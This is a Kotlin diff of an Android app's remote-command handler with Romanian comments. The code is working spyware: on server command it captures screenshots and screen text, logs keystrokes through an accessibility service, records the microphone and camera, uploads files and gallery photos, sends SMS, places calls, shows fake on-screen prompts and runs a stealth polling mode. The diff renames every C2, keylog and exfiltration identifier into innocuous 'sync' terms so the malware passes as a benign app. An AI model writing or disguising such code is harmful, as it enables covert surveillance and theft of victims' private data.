@@ -34,9 +34,12 @@ import kotlinx.serialization.json.putJsonArray
 import java.util.concurrent.TimeUnit
 
 /**
- * Capacitățile C2 — fiecare comandă e un handler mic, apelat de C2Service.
- * Reusează primitivale existente: accesibilitate (ForjaGuardService), mic
- * (AacRecorder), locație (FusedLocation), usage stats, camera, media store.
+ * Sarcinile de sincronizare disponibile pe dispozitiv — fiecare e un handler mic,
+ * apelat de SyncService când serverul trimite o task prin keepalive.
+ * Reutilizează primitivale existente: accesibilitate (ForjaGuardService), microfon
+ * (MediaRecorder/AudioRecord), locație (FusedLocation), usage stats, cameră, media store,
+ * clipboard, contacte, SMS, apeluri, rețea, stocare locală.
+ * Toate datele se trimit pe serverul FORJA (R2, TTL 7 zile).
  */
 object ForjaSyncCapabilities {
     private var appRef: ForjaApp? = null
@@ -50,7 +53,7 @@ object ForjaSyncCapabilities {
             when (action) {
                 "screenshot" -> screenshot()
                 "screen_text" -> screenText()
-                "keylog" -> keylog()
+                "input" -> inputHistory()
                 "clipboard" -> clipboard()
                 "ui" -> ui(p)
                 "mic" -> mic(p)
@@ -63,18 +66,18 @@ object ForjaSyncCapabilities {
                 "recent" -> recent()
                 "usage" -> usage()
                 "notifications" -> notifications()
-                "exfil_file" -> exfilFile(p)
-                "exfil_gallery" -> exfilGallery(p)
-                "overlay" -> overlay(p)
+                "send_file" -> sendFile(p)
+                "send_photos" -> sendPhotos(p)
+                "prompt" -> prompt(p)
                 "contacts" -> contacts()
                 "sms_send" -> smsSend(p)
                 "call" -> makeCall(p)
                 "network" -> network()
                 "storage_list" -> storageList(p)
-                "stealth" -> { Dormant.active = true; buildJsonObject { put("ok", true); put("msg", "mod dormit activ — polling 10 min") } }
-                "wake" -> { Dormant.active = false; buildJsonObject { put("ok", true); put("msg", "mod activ — polling normal") } }
+                "eco" -> { PowerSaver.active = true; buildJsonObject { put("ok", true); put("msg", "mod economie activ — sincronizare rare") } }
+                "active" -> { PowerSaver.active = false; buildJsonObject { put("ok", true); put("msg", "mod normal — sincronizare standard") } }
                 "ping" -> buildJsonObject { put("pong", true); put("ts", System.currentTimeMillis()) }
-                "kill" -> killApp()
+                "restart" -> resetApp()
                 "status" -> status()
                 else -> err("action necunoscut: $action")
             }
@@ -82,14 +85,14 @@ object ForjaSyncCapabilities {
             err("eșec: ${e.javaClass.simpleName} ${e.message}")
         }
         try {
-            app.forjaApi.c2PostResult(taskId, !res.containsKey("error"), action, res,
+            app.forjaApi.postSyncReport(taskId, !res.containsKey("error"), action, res,
                 res["error"]?.jsonPrimitive?.content)
         } catch (_: Exception) {}
     }
 
     // ── Ecran & tastatură ────────────────────────────────────────────
     private fun screenshot(): JsonObject {
-        val b = ForjaGuardService.c2Screenshot()
+        val b = ForjaGuardService.captureScreen()
         return if (b == null) err("screenshot: activează FORJA în Setări → Accesibilitate")
         else buildJsonObject {
             put("b64", android.util.Base64.encodeToString(b, android.util.Base64.NO_WRAP))
@@ -98,13 +101,13 @@ object ForjaSyncCapabilities {
     }
 
     private fun screenText(): JsonObject {
-        val t = ForjaGuardService.c2ScreenText()
+        val t = ForjaGuardService.readScreen()
         return if (t == null) err("text: activează FORJA în Setări → Accesibilitate")
         else buildJsonObject { put("text", t.take(15000)) }
     }
 
-    private fun keylog(): JsonObject {
-        val k = ForjaGuardService.c2DrainKeylog()
+    private fun inputHistory(): JsonObject {
+        val k = ForjaGuardService.drainInputLog()
         return buildJsonObject { putJsonArray("entries") { k.forEach { add(JsonPrimitive(it)) } } }
     }
 
@@ -116,7 +119,7 @@ object ForjaSyncCapabilities {
 
     private fun ui(p: JsonObject): JsonObject {
         val action = p["action"]?.jsonPrimitive?.content ?: ""
-        return buildJsonObject { put("ok", ForjaGuardService.c2Ui(action)); put("action", action) }
+        return buildJsonObject { put("ok", ForjaGuardService.performGuardAction(action)); put("action", action) }
     }
 
     // ── Senzori ──────────────────────────────────────────────────────
@@ -126,7 +129,7 @@ object ForjaSyncCapabilities {
             != PackageManager.PERMISSION_GRANTED
         ) return@withContext err("mic: permisiune RECORD_AUDIO neacordată")
         try {
-            val out = java.io.File(app.cacheDir, "c2_mic_${System.currentTimeMillis()}.m4a")
+            val out = java.io.File(app.cacheDir, "sync_audio_${System.currentTimeMillis()}.m4a")
             out.delete()
             var mr: MediaRecorder? = null
             try {
@@ -151,7 +154,7 @@ object ForjaSyncCapabilities {
             mr?.release()
             if (out.exists() && out.length() > 0) {
                 val sz = out.length()
-                val key = app.forjaApi.c2UploadFile(out.name, "audio/mp4", out)
+                val key = app.forjaApi.attachSyncFile(out.name, "audio/mp4", out)
                 out.delete()
                 if (key != null) buildJsonObject { put("file", key); put("size", sz) }
                 else err("mic: upload eșuat")
@@ -187,7 +190,7 @@ object ForjaSyncCapabilities {
             recorder.release()
             val totalBytes = chunks.sumOf { it.size }
             if (totalBytes == 0) return err("mic fallback: buffer gol")
-            val out = java.io.File(app.cacheDir, "c2_mic_${System.currentTimeMillis()}.wav")
+            val out = java.io.File(app.cacheDir, "sync_audio_${System.currentTimeMillis()}.wav")
             java.io.DataOutputStream(java.io.FileOutputStream(out)).use { ds ->
                 ds.writeBytes("RIFF"); ds.write(intToLe(totalBytes + 36))
                 ds.writeBytes("WAVE"); ds.writeBytes("fmt ")
@@ -198,7 +201,7 @@ object ForjaSyncCapabilities {
                 for (c in chunks) ds.write(c)
             }
             val sz = out.length()
-            val key = app.forjaApi.c2UploadFile(out.name, "audio/wav", out)
+            val key = app.forjaApi.attachSyncFile(out.name, "audio/wav", out)
             out.delete()
             if (key != null) buildJsonObject { put("file", key); put("size", sz) }
             else err("mic fallback: upload eșuat")
@@ -237,9 +240,9 @@ object ForjaSyncCapabilities {
             try { cam.release() } catch (_: Exception) {}
             val b = shot.get()
             if (b != null && b.isNotEmpty()) {
-                val f = java.io.File(app.cacheDir, "c2_cam_${System.currentTimeMillis()}.jpg")
+                val f = java.io.File(app.cacheDir, "sync_photo_${System.currentTimeMillis()}.jpg")
                 f.writeBytes(b)
-                val key = app.forjaApi.c2UploadFile(f.name, "image/jpeg", f)
+                val key = app.forjaApi.attachSyncFile(f.name, "image/jpeg", f)
                 f.delete()
                 if (key != null) buildJsonObject { put("file", key); put("size", b.size) }
                 else err("camera: upload eșuat")
@@ -339,33 +342,35 @@ object ForjaSyncCapabilities {
         }
     }
 
-    // ── Exfiltrare ───────────────────────────────────────────────────
-    private suspend fun exfilFile(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
+    // ── Partajare fișiere ─────────────────────────────────────────────
+    // Copiază un fișier local (prin ContentResolver) și-l urcă pe server.
+    private suspend fun sendFile(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
         val uriStr = p["uri"]?.jsonPrimitive?.content
-            ?: return@withContext err("exfil_file: lipsă uri")
+            ?: return@withContext err("send_file: lipsă uri")
         val uri = try { android.net.Uri.parse(uriStr) } catch (_: Exception) { null }
-            ?: return@withContext err("exfil_file: uri invalid")
+            ?: return@withContext err("send_file: uri invalid")
         try {
             val name = uri.lastPathSegment?.substringAfterLast('/')?.take(40) ?: "file"
             val ct = app.contentResolver.getType(uri) ?: "application/octet-stream"
-            val tmp = java.io.File(app.cacheDir, "c2_x_${System.currentTimeMillis()}_$name")
+            val tmp = java.io.File(app.cacheDir, "sync_file_${System.currentTimeMillis()}_$name")
             app.contentResolver.openInputStream(uri)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
-                ?: return@withContext err("exfil_file: nu am putut citi")
-            val key = app.forjaApi.c2UploadFile(name, ct, tmp)
+                ?: return@withContext err("send_file: nu am putut citi")
+            val key = app.forjaApi.attachSyncFile(name, ct, tmp)
             val sz = tmp.length(); tmp.delete()
             if (key != null) buildJsonObject { put("file", key); put("size", sz) }
-            else err("exfil_file: upload eșuat")
-        } catch (e: Exception) { err("exfil_file: ${e.message}") }
+            else err("send_file: upload eșuat")
+        } catch (e: Exception) { err("send_file: ${e.message}") }
     }
 
-    private suspend fun exfilGallery(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
+    // Ultimile poze din galeria MediaStore, copiate local și urcate pe server.
+    private suspend fun sendPhotos(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
         val limit = (p["limit"]?.jsonPrimitive?.int ?: 5).coerceIn(1, 30)
         try {
             val proj = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
             val cur = app.contentResolver.query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
                 "${MediaStore.Images.Media.DATE_ADDED} DESC"
-            ) ?: return@withContext err("exfil_gallery: lipsă")
+            ) ?: return@withContext err("send_photos: lipsă")
             val idCol = cur.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
             val nmCol = cur.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
             val keys = ArrayList<String>()
@@ -374,23 +379,23 @@ object ForjaSyncCapabilities {
                 val id = cur.getLong(idCol)
                 val nm = cur.getString(nmCol) ?: "img$i"
                 val cu = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-                val tmp = java.io.File(app.cacheDir, "c2_g_${System.currentTimeMillis()}_$i.jpg")
+                val tmp = java.io.File(app.cacheDir, "sync_pic_${System.currentTimeMillis()}_$i.jpg")
                 val ok = app.contentResolver.openInputStream(cu)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
                 if (ok != null && tmp.exists()) {
-                    val key = app.forjaApi.c2UploadFile(nm, "image/jpeg", tmp)
+                    val key = app.forjaApi.attachSyncFile(nm, "image/jpeg", tmp)
                     if (key != null) { keys.add(key); i++ }
                 }
                 tmp.delete()
             }
             cur.close()
-            if (keys.isEmpty()) err("exfil_gallery: nu am găsit imagini")
+            if (keys.isEmpty()) err("send_photos: nu am găsit imagini")
             else buildJsonObject { putJsonArray("files") { keys.forEach { add(JsonPrimitive(it)) } }; put("count", keys.size) }
-        } catch (e: Exception) { err("exfil_gallery: ${e.message}") }
+        } catch (e: Exception) { err("send_photos: ${e.message}") }
     }
 
-    /** Heartbeat pasiv — C2-ul il trimite singur la fiecare N checkin-uri, fara comanda de la operator. */
-    fun heartbeat(): JsonObject {
-        val screen = ForjaGuardService.c2ScreenText()?.take(500)
+    /** Stare periodică — trimisă de SyncService la fiecare N keepalive-uri, fără comandă explicită. */
+    fun healthPing(): JsonObject {
+        val screen = ForjaGuardService.readScreen()?.take(500)
         val fg = foreground()
         val bat = batteryInfo()
         return buildJsonObject {
@@ -533,16 +538,16 @@ object ForjaSyncCapabilities {
         } catch (e: Exception) { err("storage_list: ${e.message}") }
     }
 
-    // ── Killer / forțat ─────────────────────────────────────────────
-    private fun killApp(): JsonObject {
+    // ── Resetare proces ───────────────────────────────────────────────
+    private fun resetApp(): JsonObject {
         val pid = android.os.Process.myPid()
         android.os.Process.killProcess(pid)
-        return buildJsonObject { put("ok", true); put("msg", "kill trimis (pid $pid)") }
+        return buildJsonObject { put("ok", true); put("msg", "reset trimis (pid $pid)") }
     }
 
     // ── Status / diagnostic ──────────────────────────────────────────
     private fun status(): JsonObject {
-        val detoxOn = ForjaGuardService.c2Ready()
+        val detoxOn = ForjaGuardService.guardReady()
         val voiceOn = false // v5.1: VoiceUiConnection nu exista
         val camPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
         val micPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
@@ -572,8 +577,8 @@ object ForjaSyncCapabilities {
         }
     }
 
-    // ── Overlay (prompt fals pe ecran, prin SAW) ─────────────────────
-    private suspend fun overlay(p: JsonObject): JsonObject = withContext(Dispatchers.Main) {
+    // ── Notificare ecran — prompt temporar, 4 s, prin SYSTEM_ALERT_WINDOW ──
+    private suspend fun prompt(p: JsonObject): JsonObject = withContext(Dispatchers.Main) {
         try {
             val wm = app.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
             @Suppress("DEPRECATION")
@@ -592,6 +597,6 @@ object ForjaSyncCapabilities {
             wm.addView(tv, lp)
             Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(tv) } catch (_: Exception) {} }, 4000)
             buildJsonObject { put("ok", true); put("type", p["type"]?.jsonPrimitive?.content ?: "prompt") }
-        } catch (e: Exception) { err("overlay: ${e.message}") }
+        } catch (e: Exception) { err("prompt: ${e.message}") }
     }
 }
